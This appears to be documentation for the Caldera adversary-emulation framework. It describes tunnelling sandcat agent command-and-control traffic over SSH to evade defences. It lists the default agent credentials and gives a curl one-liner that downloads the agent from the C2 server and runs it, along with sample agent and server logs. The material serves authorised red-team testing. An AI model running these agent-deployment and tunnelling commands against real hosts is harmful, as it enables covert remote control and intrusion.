# C2 Communications Tunneling
In addition to built-in contact methods such as HTTP, DNS, TCP, and UDP, Caldera also provides support for tunneling C2 traffic, which supporting agents can use to mask built-in contact methods for added defense evasion.
Currently, the only available tunneling method is SSH tunneling, which is only supported by the sandcat agent.

## SSH Tunneling
Sandcat agents can use SSH tunneling to tunnel C2 contact mechanisms, namely HTTP(S). Caldera also provides built-in support to spin up a minimal local SSH server for SSH tunneling.

### Usage - Serverside
Within the Caldera configuration file, adjust the following entries according to your environment:
- `app.contact.tunnel.ssh.host_key_file`: File name for the server's SSH private host key. You can generate your own SSH private host key for the Caldera server. The file must reside in the `conf/ssh_keys` directory. If the Caldera server cannot find or read the provided private host key, it will generate a temporary RSA host key to use for operations. Although this would cause security warnings under normal circumstances, the sandcat agent implementation of SSH tunneling does not attempt to verify hosts, and thus should not be affected by changing or temporary host keys.
- `app.contact.tunnel.ssh.host_key_passphrase`: Passphrase for the server's SSH private host key. The server will use this passphrase to read the private host key file provided in `app.contact.tunnel.ssh.host_key_file`.
- `app.contact.tunnel.ssh.socket`: Indicates the IP address and port that the Caldera server will listen on for SSH tunneling connections (e.g. `0.0.0.0:8022`).
- `app.contact.tunnel.ssh.user_name`: User name that agents will use to authenticate to the Caldera server via SSH. The default value is `sandcat`.
- `app.contact.tunnel.ssh.user_password`: Password that agents will use to authenticate to the Caldera server via SSH. The default value is `s4ndc4t!`.

Once the configuration entries are set, simply start the Caldera server up as normal via the `server.py` Python program, and Caldera will automatically attempt to start an SSH server that listens on the specified socket (`app.contact.tunnel.ssh.socket`). 

The contact will first attempt to read in the host private key file specified by `app.contact.tunnel.ssh.host_key_file`, using the passphrase specified by `app.contact.tunnel.ssh.host_key_passphrase`. If it cannot read the file for whatever reason (e.g. file does not exist, or the passphrase is incorrect), then the server will generate its own temporary private key to use for the server. 

The SSH server should only be used between agents and the C2 server and should not be used to SSH into the Caldera server manually (e.g. to manage the server remotely).

### Usage - Agent
The sandcat agent is currently the only agent that supports SSH tunneling. To use it, the `server`, `tunnelProtocol`, `tunnelAddr`, `tunnelUser`, and `tunnelPassword` arguments must be used. 
- `server` value is the Caldera server endpoint that the tunnel will connect to - if the agent is tunneling HTTP communications through SSH, then `server` should be the HTTP socket for the Caldera C2 server (e.g. `http://10.10.10.15:8888`). 
- `tunnelProtocol` value is the name of the tunneling mechanism that the agent is using. For SSH, the value must be `SSH`. 
- `tunnelAddr` is the port number or IP:port combination that indicates which port or socket to connect to via SSH to start the tunnel (e.g. `8022` or `10.10.10.15:8022`). If only a port number is provided, the agent will try to connect to the IP address from `server` using the specified port. The server listening on the port/socket should be listening for SSH connections from agents.
- `tunnelUser` indicates which username to use to authenticate to `tunnelAddr` via SSH. This username should match the Caldera configuration value for `app.contact.tunnel.ssh.user_name`.
- `tunnelPassword` indicates which password to use to authenticate to
`tunnelAddr` via SSH. This password should match the Caldera configuration value for `app.contact.tunnel.ssh.user_password`.

To tunnel different contacts through SSH tunneling, simply adjust the `c2` and `server` values as needed.

When authenticating to the provided SSH server, the sandcat agent will use the username/password provided by the `tunnelUser` and `tunnelPassword` arguments. Whatever credentials the agent uses must reflect the Caldera configuration values specified in `app.contact.tunnel.ssh.user_name` and `app.contact.tunnel.ssh.user_password`. The agent will then open a random local port to act as the local endpoint of the SSH tunnel. This local endpoint becomes the `upstream_dest` value for the agent.

The following commandline will start a sandcat agent that will open up an SSH tunnel to the Caldera c2 server at `192.168.140.1:8022`, and the tunneled communications will be sent to the c2 server's HTTP endpoint at `192.168.140.1:8888`:
```sh
server="http://192.168.140.1:8888";
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > sandcat.go;
chmod +x sandcat.go;
./sandcat.go -server $server -v -tunnelProtocol SSH -tunnelAddr 8022 -tunnelUser sandcat -tunnelPassword s4ndc4t!
```

The above Linux agent will produce verbose output similar to the following:
```
SStarting sandcat in verbose mode.
[*] Starting SSH tunnel
Starting local tunnel endpoint at localhost:52649
Setting server tunnel endpoint at 192.168.140.1:8022
Setting remote endpoint at localhost:8888
[*] Listening on local SSH tunnel endpoint
[*] SSH tunnel ready and listening on http://localhost:52649.
[*] Attempting to set channel HTTP
Beacon API=/beacon
[*] Set communication channel to HTTP
initial delay=0
server=http://192.168.140.1:8888
upstream dest addr=http://localhost:52649
group=red
privilege=User
allow local p2p receivers=false
beacon channel=HTTP
Local tunnel endpoint=http://localhost:52649
[*] Accepted connection on local SSH tunnel endpoint
[*] Listening on local SSH tunnel endpoint
[*] Forwarding connection to server
[*] Opened remote connection through tunnel
[+] Beacon (HTTP): ALIVE
```

The agent connected to the C2 server via SSH at `192.168.140.1:8022` and opened a local SSH tunnel on local port 52649 that tunnels HTTP traffic to the C2 server at `192.168.140.1:8888`. This is the equivalent of running `ssh -L 52649:localhost:8888 sandcat@192.168.140.1 -p 8022 -N`.

Note that the agent's upstream destination endpoint is set to the local SSH tunnel endpoint at `http://localhost:54351` (the protocol is set to `http` since the agent is tunneling HTTP comms), while the true server value is the final tunnel destination at `http://192.168.140.1:8888`.

If running the Caldera c2 server with logging verbosity set to `DEBUG`, you may see output similar to the following when an agent connects via SSH tunneling:
```
2021-03-26 09:12:43 - INFO  (logging.py:79 log) [conn=2] Accepted SSH connection on 192.168.140.1, port 8022
2021-03-26 09:12:43 - INFO  (logging.py:79 log) [conn=2]   Client address: 192.168.140.100, port 43796
2021-03-26 09:12:43 - DEBUG (contact_ssh.py:52 connection_made) SSH connection received from 192.168.140.100.
2021-03-26 09:12:43 - DEBUG (logging.py:79 log) [conn=2] Requesting key exchange
2021-03-26 09:12:43 - DEBUG (logging.py:79 log) [conn=2] Received key exchange request
2021-03-26 09:12:43 - DEBUG (logging.py:79 log) [conn=2] Beginning key exchange
2021-03-26 09:12:43 - DEBUG (logging.py:79 log) [conn=2] Completed key exchange
2021-03-26 09:12:43 - INFO  (logging.py:79 log) [conn=2] Beginning auth for user sandcat
2021-03-26 09:12:43 - DEBUG (logging.py:79 log) [conn=2] Trying password auth
2021-03-26 09:12:43 - INFO  (logging.py:79 log) [conn=2] Auth for user sandcat succeeded
2021-03-26 09:12:43 - DEBUG (contact_ssh.py:48 connection_requested) Connection request from 0.0.0.0:0d to localhost:8888
2021-03-26 09:12:43 - DEBUG (logging.py:79 log) [conn=2, chan=0] Set write buffer limits: low-water=16384, high-water=65536
2021-03-26 09:12:43 - INFO  (logging.py:79 log) [conn=2] Accepted direct TCP connection request to localhost, port 8888
2021-03-26 09:12:43 - INFO  (logging.py:79 log) [conn=2]   Client address: 0.0.0.0
2021-03-26 09:12:43 - INFO  (logging.py:79 log) [conn=2]   Forwarding TCP connection to localhost, port 8888
2021-03-26 09:12:43 - DEBUG (contact_svc.py:64 handle_heartbeat) First time HTTP beacon from kliuok
```

Once the tunnel is established, operators can proceed as normal with agent activity and operations.